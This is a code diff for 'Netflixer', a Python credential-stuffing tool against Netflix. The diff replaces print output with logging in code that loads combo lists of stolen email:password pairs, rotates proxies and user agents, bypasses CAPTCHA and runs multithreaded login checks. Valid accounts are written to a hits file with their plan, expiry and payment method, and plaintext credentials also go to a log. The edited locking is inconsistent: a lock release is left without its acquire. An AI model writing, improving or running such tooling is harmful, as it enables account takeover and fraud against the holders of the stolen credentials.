@@ -4,9 +4,23 @@ from bs4 import BeautifulSoup
 
 from user_agent.user_agent import UserAgentGenerator
 
+import logging
+
 # Credit to Pycenter by billythegoat356
 # Github: https://github.com/billythegoat356/pycenter/
 # License: https://github.com/billythegoat356/pycenter/blob/main/LICENSE
+
+
+
+# Configure logging
+logging.basicConfig(
+    level=logging.DEBUG,  # Set the logging level
+    format='%(asctime)s - %(levelname)s - %(message)s',  # Log message format
+    handlers=[
+        logging.FileHandler("netflixer.log"),  # Log to a file
+        logging.StreamHandler()  # Log to console
+    ]
+)
 
 def center(var: str, space: int = None):  # From Pycenter
     if not space:
@@ -147,20 +161,24 @@ class Netflixer:
             SystemExit: If the combo file cannot be opened.
         """
         try:
-            print(f"[{Fore.LIGHTBLUE_EX}>{Fore.LIGHTWHITE_EX}] Path to combolist> ")
+            logging.info("Prompting user to select combo list file")
             path = easygui.fileopenbox(
                 default="*.txt",
                 filetypes=["*.txt"],
                 title="Netflixer - Select combos",
                 multiple=False,
             )
+            if not path:
+                logging.error("Failed to open combo file")
+                raise ValueError("No combo file selected")
+
             with open(path, "r", encoding="utf-8") as f:
-                for l in f:
-                    self.combos.append(l.replace("\n", ""))
+                self.combos = [l.strip() for l in f]
+                
+            logging.info(f"Successfully loaded {len(self.combos)} combos")
         except Exception as e:
-            print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Failed to open combofile")
-            os.system("pause >nul")
-            quit()
+            logging.error(f"Error in getCombos: {e}")
+            raise
 
     def getauthURL(self):
         """
@@ -180,19 +198,13 @@ class Netflixer:
                     headers={"user-agent": self.ua_generator.get_random_user_agent()},
                     proxies=random.choice(self.proxies),
                 )
-                authURL = re.search(
-                    r'<input[^>]*name="authURL"[^>]*value="([^"]*)"', login.text
-                ).group(1)
-                return authURL  # Return the authURL if successful
+                authURL = re.search(r'<input[^>]*name="authURL"[^>]*value="([^"]*)"', login.text).group(1)
+                logging.info("Successfully retrieved authURL")
+                return authURL
             except:
-                self.lock.acquire()
-                print(
-                    f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} | Proxy timeout. Change your proxies or use a different VPN"
-                )
-                self.retries += 1
-                self.lock.release()
                 if attempt == max_attempts - 1:
-                    raise Exception("Failed to retrieve authURL after multiple attempts.")
+                    logging.error("Failed to retrieve authURL after multiple attempts")
+                    raise Exception("Failed to retrieve authURL after multiple attempts")
                 time.sleep(2)  # Optional: wait before retrying
 
     def extract_date(self, input_string):
@@ -270,13 +282,14 @@ class Netflixer:
                     data=data,
                 )
                 captcha_token = "".join(re.findall('\["rresp","(.*?)"', str(req.text)))
+                logging.info("Successfully bypassed CAPTCHA")
                 return captcha_token
             except Exception as e:
+                logging.warning(f"CAPTCHA bypass attempt {attempt + 1} failed: {e}")
                 if attempt == max_attempts - 1:
+                    logging.error(f"CAPTCHA bypass failed after {max_attempts} attempts")
                     raise Exception(f"CAPTCHA bypass failed after {max_attempts} attempts: {str(e)}")
-                else:
-                    print(f"CAPTCHA bypass attempt {attempt + 1} failed. Retrying...")
-                    time.sleep(2)  # Wait for 2 seconds before retrying
+                time.sleep(2)
 
     def checker(self, email, password):
         """
@@ -362,38 +375,23 @@ class Netflixer:
                 except:
                     pass
                 self.lock.acquire()
-                print(
-                    f"[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] {Fore.LIGHTBLUE_EX}HIT{Fore.RESET} | {email} | {password} | {plan} | {expiry}"
-                )
+                logging.info(f"HIT | {email} | {password} | {plan} | {expiry}")
                 self.hits += 1
                 with open("./results/hits.txt", "a", encoding="utf-8") as fp:
-                    fp.writelines(
-                        f"{email}:{password} | Member since =  {member_since} | Plan =  {plan} | Validity =  {expiry} | Payment method = {payment_method}\n"
-                    )
+                    fp.writelines(f"{email}:{password} | Member since = {member_since} | Plan = {plan} | Validity = {expiry} | Payment method = {payment_method}\n")
                 self.lock.release()
             else:
-                self.lock.acquire()
-                print(
-                    f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}BAD{Fore.RESET} | {email} | {password} "
-                )
+                logging.info(f"BAD | {email} | {password}")
                 self.bad += 1
-                self.lock.release()
 
         except requests.exceptions.RequestException:
-            self.lock.acquire()
-            print(
-                f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} | Proxy timeout. Change your proxies or use a different VPN"
-            )
+            logging.error("Proxy timeout. Change your proxies or use a different VPN")
             self.retries += 1
             self.lock.release()
 
         except Exception as e:
-            self.lock.acquire()
-            print(
-                f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} {e}"
-            )
+            logging.error(f"Unexpected error in checker: {e}")
             self.retries += 1
-            self.lock.release()
 
     def worker(self, combos, thread_id):
         """
@@ -413,17 +411,15 @@ class Netflixer:
         The main entry point for the Netflixer tool. It orchestrates the user interface, proxy and combo loading,
         thread management, and the overall login checking process.
         """
+        logging.info("Starting Netflixer")
         self.ui()
         self.getProxies()
         self.getCombos()
         try:
-            self.threadcount = int(
-                input(f"[{Fore.LIGHTBLUE_EX}>{Fore.RESET}] Threads> ")
-            )
+            self.threadcount = int(input(f"[{Fore.LIGHTBLUE_EX}>{Fore.RESET}] Threads> "))
         except ValueError:
-            print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Value must be an integer")
-            os.system("pause >nul")
-            quit()
+            logging.error("Invalid thread count input")
+            raise ValueError("Thread count must be an integer")
 
         self.ui()
         self.start = time.time()
@@ -433,25 +429,15 @@ class Netflixer:
         threads = []
         self.check = [0 for i in range(self.threadcount)]
         for i in range(self.threadcount):
-            sliced_combo = self.combos[
-                int(len(self.combos) / self.threadcount * i) : int(
-                    len(self.combos) / self.threadcount * (i + 1)
-                )
-            ]
-            t = threading.Thread(
-                target=self.worker,
-                args=(
-                    sliced_combo,
-                    i,
-                ),
-            )
+            sliced_combo = self.combos[int(len(self.combos) / self.threadcount * i) : int(len(self.combos) / self.threadcount * (i + 1))]
+            t = threading.Thread(target=self.worker, args=(sliced_combo, i,))
             threads.append(t)
             t.start()
 
         for t in threads:
             t.join()
 
-        print(f"[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] Task completed")
+        logging.info("Task completed")
         os.system("pause>nul")
 
 
